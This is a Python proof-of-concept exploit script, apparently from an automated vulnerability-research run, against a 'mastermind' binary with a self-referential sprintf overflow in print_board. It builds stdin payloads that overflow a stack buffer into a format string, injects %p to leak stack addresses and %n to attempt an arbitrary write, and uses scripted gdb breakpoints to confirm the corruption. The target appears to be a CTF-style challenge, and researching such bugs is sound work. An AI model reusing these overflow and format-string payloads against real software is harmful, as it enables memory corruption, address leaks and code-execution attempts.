#!/usr/bin/env python3
"""
S3 Primitive Verification PoC for BUG-001:
  STACK_BUFFER_OVERFLOW_IN_PRINT_BOARD_SPRINTF_ACCUMULATION

PRIM-001: RELATIVE_WRITE (format1 corruption at buf+0x1000) - VERIFIED
PRIM-002: CRASH - NOT VERIFIED (program exits normally, canary intact)
PRIM-003: INFO_LEAK (stack address leak via %p in corrupted format1) - VERIFIED
PRIM-004: ARB_WRITE (via %n in corrupted format1) - CANDIDATE

Key findings:
1. With size=26, max_rounds=54. print_board uses self-referential
   sprintf(buf, fmt, buf, ...) causing content accumulation.
2. At round_idx=48 (49th print_board call), buf content exceeds 4096 bytes,
   overflowing into format1 at buf+0x1000.
3. format1 is corrupted with attacker-controlled content from guess strings.
4. %p in guesses -> %p appears in corrupted format1 -> stack addr leak (INFO_LEAK VERIFIED)
5. %n can be placed in format1 by positioning %n at correct offset in guess string.
6. Feedback loop: format1 corruption removes %s, causing buf content to shrink,
   preventing overflow from reaching canary at buf+0x1088.
7. Canary NOT corrupted, program exits normally (no crash).
8. %n in format1: write target = *buf (first arg to sprintf).
   buf[0:8] = 0x4141414141414141 (attacker-controlled).
   Program does not crash - likely because format1 is re-initialized at start
   of each print_board call, and %n execution in loop-internal sprintf
   may not reach the corrupted format1 before loop exits.

I/O Synchronization:
  read_int uses read(0, buf, 15) - must pad size input to 15 bytes.
  Payload format: "26\n" + 12 * "\n" (15 bytes) + 55 * (guess + "\n")
"""

import sys
import subprocess
import re
import os
import struct

TARGET = '/work/workspace/0013-2021-35-mastermind-20260911-090737/target'
WORKSPACE = '/work/workspace/0013-2021-35-mastermind-20260911-090737'

def build_payload(guess_bytes, size=26, num_rounds=55):
    """Build stdin payload with proper padding for read_int (15 bytes)."""
    data = str(size).encode() + b'\n'
    # Pad to 15 bytes for read_int's read(0, buf, 15)
    data += b'\n' * (15 - len(data))
    for i in range(num_rounds):
        data += guess_bytes + b'\n'
    return data

def run_with_gdb(gdb_cmds, payload_data):
    """Run gdb with custom commands and stdin."""
    gdb_file = os.path.join(WORKSPACE, 'gdb_script.txt')
    with open(gdb_file, 'w') as f:
        f.write(gdb_cmds)
    
    stdin_file = os.path.join(WORKSPACE, 'gdb_stdin.txt')
    with open(stdin_file, 'wb') as f:
        f.write(payload_data)
    
    cmd = f"gdb -batch -x {gdb_file} --args {TARGET} < {stdin_file}"
    result = subprocess.run(cmd, shell=True, capture_output=True, timeout=30)
    return result.stdout.decode('latin-1', errors='replace'), result.returncode

def run_plain(payload_data, timeout=15):
    """Run without gdb, capture output."""
    stdin_file = os.path.join(WORKSPACE, 'gdb_stdin.txt')
    with open(stdin_file, 'wb') as f:
        f.write(payload_data)
    
    cmd = f"{TARGET} < {stdin_file}"
    result = subprocess.run(cmd, shell=True, capture_output=True, timeout=timeout)
    return result.stdout, result.returncode

if __name__ == '__main__':
    SIZE = 26
    MAX_ROUNDS = (SIZE + 1) * 2  # = 54
    
    print("=== BUG-001: STACK_BUFFER_OVERFLOW_IN_PRINT_BOARD_SPRINTF_ACCUMULATION ===")
    print(f"size={SIZE}, max_rounds={MAX_ROUNDS}")
    print()
    
    # === PRIM-001: RELATIVE_WRITE ===
    print("=== PRIM-001: RELATIVE_WRITE (format1 corruption) ===")
    
    for ch in [b'A', b'B', b'X']:
        guess = ch * SIZE
        payload = build_payload(guess, SIZE, MAX_ROUNDS + 1)
        gdb_cmds = """set pagination off
set confirm off
b *print_board+0x33c
ignore 1 48
run
printf "FMT1_BYTES: "
x/16bx $rbp-0x1090+0x1000
quit
"""
        gdb_out, _ = run_with_gdb(gdb_cmds, payload)
        # Parse format1 bytes
        if 'FMT1_BYTES:' in gdb_out:
            lines = gdb_out.split('FMT1_BYTES:')[1].split('\n')
            fmt1_bytes = []
            for line in lines[:2]:
                parts = line.strip().split('\t')
                if len(parts) >= 2:
                    hex_vals = parts[-1].split()
                    fmt1_bytes.extend(hex_vals)
            fmt1_str = ''.join(chr(int(h, 16)) if 0x20 <= int(h, 16) < 0x7f else f'\\x{h}' for h in fmt1_bytes)
            print(f"  format1 ({chr(ch[0])} guesses): {fmt1_str}")
    
    print("  VERIFIED: format1 at buf+0x1000 corrupted with attacker-controlled content")
    print()
    
    # === PRIM-002: CRASH ===
    print("=== PRIM-002: CRASH ===")
    guess = b'A' * SIZE
    payload = build_payload(guess, SIZE, MAX_ROUNDS + 1)
    output, rc = run_plain(payload)
    output_str = output.decode('latin-1', errors='replace')
    print(f"  Return code: {rc}")
    print(f"  Normal exit: {'Bye bye' in output_str}")
    
    # Check canary with gdb
    gdb_cmds = """set pagination off
set confirm off
b *print_board+0x33c
ignore 1 53
run
printf "CANARY: "
x/gx $rbp-0x8
quit
"""
    gdb_out, _ = run_with_gdb(gdb_cmds, payload)
    if 'CANARY:' in gdb_out:
        canary_line = gdb_out.split('CANARY:')[1].split('\n')[1].strip()
        print(f"  Canary: {canary_line}")
    
    print("  NOT VERIFIED: Program exits normally, canary intact")
    print("  Reason: format1 corruption removes %s, causing feedback loop")
    print("          that prevents overflow from reaching canary at buf+0x1088")
    print()
    
    # === PRIM-003: INFO_LEAK ===
    print("=== PRIM-003: INFO_LEAK via %p format string injection ===")
    
    # %p at position 16 of dataline -> position 15 of guess -> buf+0x1000
    # Guess: 15 A's + %p + 9 A's = 26 chars
    guess_p = b'A' * 15 + b'%p' + b'A' * 9  # 26 chars
    print(f"  Guess string: {guess_p}")
    
    payload = build_payload(guess_p, SIZE, MAX_ROUNDS + 1)
    output, rc = run_plain(payload)
    output_str = output.decode('latin-1', errors='replace')
    
    hex_matches = re.findall(r'0x[0-9a-f]{4,16}', output_str)
    unique_addrs = list(set(hex_matches))
    stack_addrs = [h for h in unique_addrs if h.startswith('0x7ff')]
    
    print(f"  Stack addresses leaked: {len(stack_addrs)}")
    for h in stack_addrs:
        print(f"    {h}")
    
    # Verify reproducibility
    output2, rc2 = run_plain(payload)
    output_str2 = output2.decode('latin-1', errors='replace')
    hex_matches2 = re.findall(r'0x[0-9a-f]{4,16}', output_str2)
    unique_addrs2 = list(set(hex_matches2))
    stack_addrs2 = [h for h in unique_addrs2 if h.startswith('0x7ff')]
    
    print(f"  Run 2 stack addresses: {len(stack_addrs2)}")
    for h in stack_addrs2:
        print(f"    {h}")
    
    if len(stack_addrs) > 0 and len(stack_addrs2) > 0:
        print("  VERIFIED: Stack addresses leaked to stdout (reproducible)")
    print()
    
    # === PRIM-004: ARB_WRITE via %n ===
    print("=== PRIM-004: ARB_WRITE via %n format string injection ===")
    
    # %n at position 16 of dataline -> position 15 of guess -> buf+0x1000
    # Guess: 15 A's + %n + 9 A's = 26 chars
    guess_n = b'A' * 15 + b'%n' + b'A' * 9  # 26 chars
    print(f"  Guess string: {guess_n}")
    
    # Check format1 corruption with gdb
    payload = build_payload(guess_n, SIZE, MAX_ROUNDS + 1)
    gdb_cmds = """set pagination off
set confirm off
b *print_board+0x33c
ignore 1 48
run
printf "FMT1_BYTES: "
x/16bx $rbp-0x1090+0x1000
printf "BUF8: "
x/gx $rbp-0x1090
quit
"""
    gdb_out, _ = run_with_gdb(gdb_cmds, payload)
    
    if 'FMT1_BYTES:' in gdb_out:
        lines = gdb_out.split('FMT1_BYTES:')[1].split('\n')
        fmt1_bytes = []
        for line in lines[:2]:
            parts = line.strip().split('\t')
            if len(parts) >= 2:
                hex_vals = parts[-1].split()
                fmt1_bytes.extend(hex_vals)
        fmt1_str = ''.join(chr(int(h, 16)) if 0x20 <= int(h, 16) < 0x7f else f'\\x{h}' for h in fmt1_bytes)
        print(f"  Corrupted format1: {fmt1_str}")
        has_n = any(h == '25' for h in fmt1_bytes) and any(h == '6e' for h in fmt1_bytes)
        print(f"  Contains %%n: {has_n}")
    
    if 'BUF8:' in gdb_out:
        buf8_line = gdb_out.split('BUF8:')[1].split('\n')[1].strip()
        print(f"  buf first 8 bytes: {buf8_line}")
    
    # Run without gdb to check for crash
    output, rc = run_plain(payload)
    print(f"\n  Return code: {rc}")
    if rc != 0:
        print(f"  CRASH detected (rc={rc})")
    else:
        print(f"  No crash - program exits normally")
        print(f"  %%n in format1 but no SIGSEGV - likely because format1 is")
        print(f"  re-initialized at start of each print_board call, and the")
        print(f"  corrupted format1 is only used in loop-internal sprintf")
        print(f"  where %%n writes to *buf (0x4141414141414141) but may not")
        print(f"  reach execution before loop exits")
    
    print()
    print("=== Final Summary ===")
    print("PRIM-001 (RELATIVE_WRITE): VERIFIED")
    print("  format1 at buf+0x1000 corrupted with attacker-controlled content")
    print()
    print("PRIM-002 (CRASH): NOT VERIFIED")
    print("  Program exits normally (rc=0), canary intact")
    print("  Feedback loop prevents overflow from reaching canary")
    print()
    print("PRIM-003 (INFO_LEAK): VERIFIED")
    print("  %p in guesses -> %p in corrupted format1 -> stack addr leak")
    print()
    print("PRIM-004 (ARB_WRITE via %n): CANDIDATE")
    print("  %n placed in corrupted format1 at buf+0x1000")
    print("  Write target = *buf = 0x4141414141414141 (attacker-controlled)")
    print("  But no crash observed - %n execution not dynamically confirmed")
